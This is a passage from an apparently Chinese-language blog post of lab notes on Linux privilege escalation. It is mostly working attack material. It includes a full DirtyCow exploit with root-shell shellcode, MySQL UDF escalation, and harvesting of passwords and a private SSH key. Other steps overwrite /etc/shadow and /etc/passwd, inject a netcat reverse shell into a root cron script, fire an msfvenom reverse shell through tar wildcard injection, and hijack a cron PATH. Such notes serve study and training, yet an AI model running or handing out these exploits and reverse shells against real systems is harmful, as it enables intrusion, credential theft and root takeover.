class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>,</span><br><span class="line">  <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sc_len = <span class="number">177</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i</span></span><br><span class="line"><span class="comment">unsigned char shell_code[] = &#123;</span></span><br><span class="line"><span class="comment">  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,</span></span><br><span class="line"><span class="comment">  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,</span></span><br><span class="line"><span class="comment">  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,</span></span><br><span class="line"><span class="comment">  0x89, 0xe1, 0xcd, 0x80</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">unsigned int sc_len = 136;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">200000000</span>;i++)</span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                                \n\</span></span><br><span class="line"><span class="string">   (___)                                   \n\</span></span><br><span class="line"><span class="string">   (o o)_____/                             \n\</span></span><br><span class="line"><span class="string">    @@ `     \\                            \n\</span></span><br><span class="line"><span class="string">     \\ ____, /%s                          \n\</span></span><br><span class="line"><span class="string">     //    //                              \n\</span></span><br><span class="line"><span class="string">    ^^    ^^                               \n\</span></span><br><span class="line"><span class="string">&quot;</span>, suid_binary);</span><br><span class="line">  <span class="keyword">char</span> *backup;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;DirtyCow root privilege escalation\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Backing up %s to /tmp/bak\n&quot;</span>, suid_binary);</span><br><span class="line">  asprintf(&amp;backup, <span class="string">&quot;cp %s /tmp/bak&quot;</span>, suid_binary);</span><br><span class="line">  system(backup);</span><br><span class="line"></span><br><span class="line">  f=open(suid_binary,O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size+<span class="keyword">sizeof</span>(<span class="keyword">long</span>),PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %x\n\n&quot;</span>,<span class="built_in">map</span>);</span><br><span class="line">  pid=fork();</span><br><span class="line">  <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">    waitpid(pid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u,i,o,c=<span class="number">0</span>,l=sc_len;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10000</span>/l;i++)</span><br><span class="line">      <span class="keyword">for</span>(o=<span class="number">0</span>;o&lt;l;o++)</span><br><span class="line">        <span class="keyword">for</span>(u=<span class="number">0</span>;u&lt;<span class="number">10000</span>;u++)</span><br><span class="line">          c+=ptrace(PTRACE_POKETEXT,pid,<span class="built_in">map</span>+o,*((<span class="keyword">long</span>*)(shell_code+o)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n\n&quot;</span>,c);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(),SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/faae7eb947602f5192ad9fbdec6c3652.png" alt="image-20220519152241925"></p><hr><h3 id="4-服务提权"><a href="#4-服务提权" class="headerlink" title="#4 服务提权"></a>#4 服务提权</h3><ul><li>Mysql UDF提权：<a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&quot;secure%&quot;</span>;<span class="comment">#查看是否有上传权限</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |<span class="comment">#secure_file_priv值需要为空</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ searchsploit -m 1518  <span class="comment">#获取exp</span></span><br><span class="line">$ mv 1518.c raptor_udf2.c<span class="comment">#重命名</span></span><br><span class="line">$ gcc -g -c raptor_udf2.c<span class="comment">#编译</span></span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"></span><br><span class="line">$ mysql -u root -p<span class="comment">#登录Mysql</span></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/user/tools/mysql-udf/raptor_udf2.so&#x27;</span>));<span class="comment">#记得修改路径</span></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);</span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br><span class="line">$ /tmp/rootbash -p<span class="comment">#退出mysql后执行命令</span></span><br><span class="line"></span><br><span class="line">rootbash-4.1<span class="comment"># id</span></span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">rm /tmp/rootbash  <span class="comment">#请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="5-密码-amp-密钥"><a href="#5-密码-amp-密钥" class="headerlink" title="#5 密码&amp;密钥"></a>#5 密码&amp;密钥</h3><ul><li> 历史命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/.*<span class="built_in">history</span></span><br></pre></td></tr></table></figure><ul><li> 配置文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /home/user/myvpn.ovpn</span><br><span class="line">client</span><br><span class="line">......</span><br><span class="line">remote-cert-tls server</span><br><span class="line">auth-user-pass /etc/openvpn/auth.txt<span class="comment">#包含密码txt文件</span></span><br><span class="line">comp-lzo</span><br><span class="line">verb 1</span><br><span class="line">reneg-sec 0</span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /etc/openvpn/auth.txt</span><br><span class="line">root</span><br><span class="line">password123<span class="comment">#获取密码</span></span><br></pre></td></tr></table></figure><ul><li> SSH密钥    (藏在根目录)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls  -la /.ssh</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 Aug 25  2019 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Aug 25  2019 ..</span><br><span class="line">-rw-r--r--  1 root root 1679 Aug 25  2019 root_key</span><br><span class="line">user@debian:~$ cat /.ssh/root_key </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm</span><br><span class="line">gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl</span><br><span class="line">p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo</span><br><span class="line">OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD</span><br><span class="line">eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET</span><br><span class="line">Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2</span><br><span class="line">NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ</span><br><span class="line">YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+</span><br><span class="line">5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el</span><br><span class="line">WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7</span><br><span class="line">VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7</span><br><span class="line">6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW</span><br><span class="line">1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K</span><br><span class="line">824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6</span><br><span class="line">Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc</span><br><span class="line">U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1</span><br><span class="line">Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi</span><br><span class="line">SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV</span><br><span class="line">d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im</span><br><span class="line">jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa</span><br><span class="line">871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok</span><br><span class="line">X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4</span><br><span class="line">CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN</span><br><span class="line">Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4</span><br><span class="line">LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">$ chmod 600 root_key</span><br><span class="line">$ ssh -i root_key root@10.10.63.222</span><br></pre></td></tr></table></figure><ul><li>查找/etc下的密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line">grep -r password</span><br></pre></td></tr></table></figure><hr><h3 id="6-弱文件权限"><a href="#6-弱文件权限" class="headerlink" title="#6 弱文件权限"></a>#6 弱文件权限</h3><ul><li>shadow文件可读可写</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#破解hash</span></span><br><span class="line">$ ls -l /etc/shadow</span><br><span class="line">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow<span class="comment">#文件可读可写</span></span><br><span class="line"></span><br><span class="line">$ cat /etc/shadow</span><br><span class="line">root:$6<span class="variable">$Tb</span>/euwmK<span class="variable">$OXA</span>.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</span><br><span class="line">daemon:*:17298:0:99999:7:::</span><br><span class="line">bin:*:17298:0:99999:7:::</span><br><span class="line"></span><br><span class="line">$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入hash</span></span><br><span class="line">$ mkpasswd -m sha-512 123456</span><br><span class="line">$6<span class="variable">$G770c2Pp4gpik</span>//c<span class="variable">$3m2qme9asqkg5lJ1DNX9YcGitn6Ek7r6IKsWEF8</span>.Z8N8SJctCdbaTxs1Fcvvqzy/QrQ3TOJIA9KzK9Mf8qBVm/</span><br><span class="line">$ nano /etc/shadow</span><br><span class="line">$ su root</span><br></pre></td></tr></table></figure><ul><li>可写/etc/passwd<ul><li>用户名:密码:UID:GID:用户信息:家目录:命令/shell</li><li>test:X:0:0:root:/root:/bin/bash</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ openssl passwd -1 -salt [salt] [password]</span><br><span class="line">$ openssl passwd -1 -salt new 123</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd     <span class="comment">#注意$符需要转义</span></span><br></pre></td></tr></table></figure><hr><h3 id="7-定时任务"><a href="#7-定时任务" class="headerlink" title="#7 定时任务"></a>#7 定时任务</h3><ul><li><h6 id="定时文件可编辑"><a href="#定时文件可编辑" class="headerlink" title="定时文件可编辑"></a>定时文件可编辑</h6></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">user4@polobox:~$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">*/5  *    * * * root    /home/user4/Desktop/autoscript.sh</span><br><span class="line">17 ** * *root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6* * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6* * 7root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 61 * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mkfifo /tmp/tfrn; nc 10.11.53.68 8888 0&lt;/tmp/tfrn | /bin/sh &gt;/tmp/tfrn 2&gt;&amp;1; rm /tmp/tfrn&quot;</span> &gt;&gt; /home/user4/Desktop/autoscript.sh</span><br></pre></td></tr></table></figure><ul><li>tar 通配符</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">17 ** * *root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6* * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6* * 7root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 61 * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">* * * * * root overwrite.sh</span><br><span class="line">* * * * * root /usr/<span class="built_in">local</span>/bin/compress.sh<span class="comment">#这个文件</span></span><br><span class="line"></span><br><span class="line">user@debian:~$ cat /usr/<span class="built_in">local</span>/bin/compress.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/user</span><br><span class="line">tar czf /tmp/backup.tar.gz *<span class="comment">#tar 命令后面跟的是通配符*</span></span><br><span class="line"></span><br><span class="line">$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.53.68 LPORT=4444 -f elf -o shell.elf<span class="comment">#生成反向shell</span></span><br><span class="line">$ scp shell.elf user@10.10.63.222:/home/user/<span class="comment">#传输到目标机</span></span><br><span class="line">$ chomd +x shell.elf</span><br><span class="line">$ touch /home/user/--checkpoint=1<span class="comment">#在/home/user目录中创建两个文件</span></span><br><span class="line">$ touch /home/user/--checkpoint-action=<span class="built_in">exec</span>=shell.elf<span class="comment">#在/home/user目录中创建两个文件</span></span><br><span class="line">$ user@debian:~$ ls</span><br><span class="line">--checkpoint=1  --checkpoint-action=<span class="built_in">exec</span>=shell.elf  myvpn.ovpn  shell.elf  tools</span><br><span class="line">$ nc -lvp 4444<span class="comment">#开启监听</span></span><br></pre></td></tr></table></figure><ul><li>crontab-PATH 环境变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin<span class="comment">#请注意，PATH 变量以 /home/user开头，这是我们用户的主目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">17 ** * *root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6* * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6* * 7root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 61 * *root<span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">* * * * * root overwrite.sh</span><br><span class="line">* * * * * root /usr/<span class="built_in">local</span>/bin/compress.sh</span><br><span class="line"></span><br><span class="line">user@debian:~$ nano overwrite.sh</span><br><span class="line">user@debian:~$ chmod +x /home/user/overwrite.sh</span><br><span class="line">user@debian:~$ cat overwrite.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/rootbash</span><br><span class="line">chmod +xs /tmp/rootbash</span><br><span class="line">user@debian:~$ /tmp/rootbash -p<span class="comment">#等待脚本执行后</span></span><br><span 